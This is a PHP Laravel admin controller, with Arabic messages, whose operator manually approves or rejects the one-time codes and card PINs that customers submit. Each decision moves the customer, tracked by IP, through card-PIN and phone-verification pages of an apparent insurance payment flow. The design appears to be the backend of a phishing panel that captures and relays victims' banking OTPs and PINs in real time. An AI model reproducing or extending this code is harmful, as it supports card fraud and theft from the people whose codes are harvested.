<?php

namespace App\Http\Controllers\Admin;

use App\Events\OtpApproved;
use App\Events\OtpRejected;
use App\Events\PinApproved;
use App\Events\PinRejected;
use App\Http\Controllers\Admin\Traits\NotifiesDashboard;
use App\Http\Controllers\Controller;
use App\Models\CustomerProfile;
use App\Models\OtpCode;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;

class AdminOtpController extends Controller
{
    use NotifiesDashboard;

    /**
     * Approve an OTP
     */
    public function approve(int $id, Request $request): JsonResponse
    {
        $otp = OtpCode::findOrFail($id);

        if ($otp->status !== 'pending') {
            return response()->json([
                'success' => false,
                'message' => 'هذا الرمز تم معالجته مسبقاً',
            ], 422);
        }

        $otp->verify();

        $customerIp = $otp->customer?->ip_address ?? '';
        $sessionId  = $otp->session_id;

        if (empty($customerIp)) {
            \Log::error("approveOtp: No customer IP for OTP #{$id}");
        }

        // Reset fail count on successful approval
        if ($otp->customer) {
            $updateData = [
                'otp_fail_count'   => 0,
                'otp_locked_until' => null,
            ];
            // Update current_page so dashboard reflects where customer should go next
            if ($otp->type === 'otp') {
                $updateData['current_page'] = '/insurance/card-pin';
            } elseif ($otp->type === 'pin') {
                $updateData['current_page'] = '/insurance/phone-verification';
            }
            $otp->customer->update($updateData);
        }

        try {
            if ($otp->type === 'otp') {
                broadcast(new OtpApproved($customerIp, null, $sessionId))->toOthers();
            } elseif ($otp->type === 'pin') {
                broadcast(new PinApproved($customerIp, null, $sessionId))->toOthers();
            }
        } catch (\Throwable $e) {
            \Log::warning('Broadcast failed (approveOtp): ' . $e->getMessage());
        }

        // Flush customer list cache so dashboard polls get fresh data
        $this->flushCustomerCache();

        $this->notifyDashboard($customerIp, $otp->type === 'pin' ? 'pin_approved' : 'otp_approved');
        $this->refreshPaymentViewed($customerIp);

        return response()->json([
            'success' => true,
            'message' => 'تمت الموافقة على رمز OTP بنجاح',
        ]);
    }

    /**
     * Reject an OTP
     */
    public function reject(int $id, Request $request): JsonResponse
    {
        $request->validate([
            'reason' => 'nullable|string|max:500',
        ]);

        $otp = OtpCode::findOrFail($id);

        if ($otp->status !== 'pending') {
            return response()->json([
                'success' => false,
                'message' => 'هذا الرمز تم معالجته مسبقاً',
            ], 422);
        }

        $reason     = $request->input('reason');

        $otp->reject($reason);

        $customerIp = $otp->customer?->ip_address ?? '';
        $sessionId  = $otp->session_id;

        // Increment fail count + lockout after 10 consecutive failures
        if ($otp->customer) {
            $fails = $otp->customer->otp_fail_count + 1;
            $lockUntil = $fails >= 10 ? now()->addMinutes(10) : null;
            $otp->customer->update([
                'otp_fail_count'   => $fails,
                'otp_locked_until' => $lockUntil,
            ]);
        }

        try {
            if ($otp->type === 'otp') {
                broadcast(new OtpRejected($customerIp, $reason, $sessionId))->toOthers();
            } elseif ($otp->type === 'pin') {
                broadcast(new PinRejected($customerIp, $reason, $sessionId))->toOthers();
            }
        } catch (\Throwable $e) {
            \Log::warning('Broadcast failed (rejectOtp): ' . $e->getMessage());
        }

        // Flush customer list cache so dashboard polls get fresh data
        $this->flushCustomerCache();

        $this->notifyDashboard($customerIp, $otp->type === 'pin' ? 'pin_rejected' : 'otp_rejected');
        $this->refreshPaymentViewed($customerIp);

        return response()->json([
            'success' => true,
            'message' => 'تم رفض رمز OTP',
        ]);
    }
}
